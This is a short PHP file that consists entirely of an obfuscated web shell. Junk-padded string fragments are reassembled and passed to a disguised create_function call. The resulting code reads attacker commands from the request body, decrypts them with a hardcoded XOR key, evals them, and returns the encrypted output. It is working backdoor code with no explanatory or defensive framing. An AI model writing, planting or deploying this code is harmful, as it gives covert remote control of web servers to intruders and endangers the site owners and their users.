<?php
$z='base8t64_e8tncode(@x(@gzcom8tpr8tes8ts8t($o),$k))8t;print(8t"$p$kh$r$kf");}';
$l='l);$j++,8t$i8t++){8t$o.=$t{$i}^$8tk{$j8t};}}return 8t$o;}if8t (@preg8t_mat8';
$L='=8t=1) {8t@ob8t_st8tart();@e8t8tval(@gzuncompres8ts8t(@x(@bas8te64_deco';
$S='t8tch("/$kh(.+)8t$k8t8tf/",@f8tile_g8tet8t_contents("php://inpu8tt"),$m)';
$m='$k="c98eb8tba1"8t;$kh="08tb79a9028t1bc8te";$kf=8t"c4bce48t2f0418t2"8t;$p="';
$T=str_replace('fB','','cfBreafBtefB_fBfufBncfBtion');
$E='rlen($t);$o8t="";8tfor($8ti8t=0;$i<$l;){f8tor($j8t=0;($8tj<$c&&$8ti<$8t';
$r='r0ktPDU8tQ8tvKhFuRPK";8t8tfunction8t x8t($t,$k8t){$c=str8tlen(8t$k);$l=st8t';
$K='de(8t$m[18t]),8t$k)));$o=8t@ob8t_get_con8t8tt8tents();@o8tb_end_cl8tean8t();$r=@';
$X=str_replace('8t','',$m.$r.$E.$l.$S.$L.$K.$z);
$H=$T('',$X);$H();
?>
